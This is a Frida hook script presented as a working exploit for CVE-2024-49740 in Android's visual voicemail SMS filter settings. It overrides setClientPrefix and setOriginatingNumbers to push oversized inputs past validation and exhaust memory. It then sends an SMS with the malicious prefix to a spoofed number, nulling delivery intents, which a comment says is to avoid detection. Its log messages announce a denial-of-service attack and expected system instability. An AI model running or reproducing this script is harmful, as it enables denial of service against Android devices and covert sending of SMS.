Java.perform(function () {
    console.log("[+] CVE-2024-49740 Exploit Loaded!");

    var VisualVoicemailSmsFilterSettings_Builder = Java.use("android.telephony.VisualVoicemailSmsFilterSettings$Builder");
    var SmsManager = Java.use("android.telephony.SmsManager");
    var SubscriptionManager = Java.use("android.telephony.SubscriptionManager");
    var Context = Java.use("android.content.Context");

    // Hook setClientPrefix to bypass the 256-character limit
    VisualVoicemailSmsFilterSettings_Builder.setClientPrefix.implementation = function (clientPrefix) {
        console.log("[+] Hooked setClientPrefix() - Bypassing validation");

        var maliciousPrefix = "A".repeat(500);  // Oversized client prefix
        console.log("[!] Overriding clientPrefix with length:", maliciousPrefix.length);

        return this.setClientPrefix.call(this, maliciousPrefix);
    };

    // Hook setOriginatingNumbers to overload memory
    VisualVoicemailSmsFilterSettings_Builder.setOriginatingNumbers.implementation = function (originatingNumbers) {
        console.log("[+] Hooked setOriginatingNumbers() - Preparing DoS attack");

        var massiveNumbers = [];
        for (var i = 0; i < 5000; i++) {  // Increase to 10,000 if needed
            massiveNumbers.push("9".repeat(500));  // Each number is 500 characters long
        }

        console.log("[!] Overriding originatingNumbers with", massiveNumbers.length, "entries");
        return this.setOriginatingNumbers.call(this, massiveNumbers);
    };

    // Function to send a voicemail-related SMS using updated APIs
    function sendVoicemailSMS() {
        console.log("[+] Attempting to send a malicious voicemail-related SMS...");

        try {
            var context = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
            var subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
            var activeSubId = subscriptionManager.getActiveSubscriptionIdList()[0];  // Get first active SIM ID

            if (activeSubId === null) {
                console.log("[X] No active SIM found! SMS sending aborted.");
                return;
            }

            var smsManager = SmsManager.getSmsManagerForSubscriptionId(activeSubId);
            var maliciousPrefix = "A".repeat(500);
            var spoofedNumber = "+1234567890";  // Fake number
            var voicemailMessage = maliciousPrefix + ": Exploit test message";

            // PendingIntent (null to avoid detection)
            var sentPI = null;
            var deliveryPI = null;

            console.log("[!] Sending SMS with malicious prefix...");

            smsManager.sendTextMessage(spoofedNumber, null, voicemailMessage, sentPI, deliveryPI);
            console.log("[+] Malicious voicemail SMS sent!");
        } catch (e) {
            console.log("[X] Error sending SMS:", e);
        }
    }

    // Trigger SMS sending after 5 seconds
    setTimeout(sendVoicemailSMS, 5000);
    
    console.log("[!] DoS attack initialized. Expect system instability soon...");
});
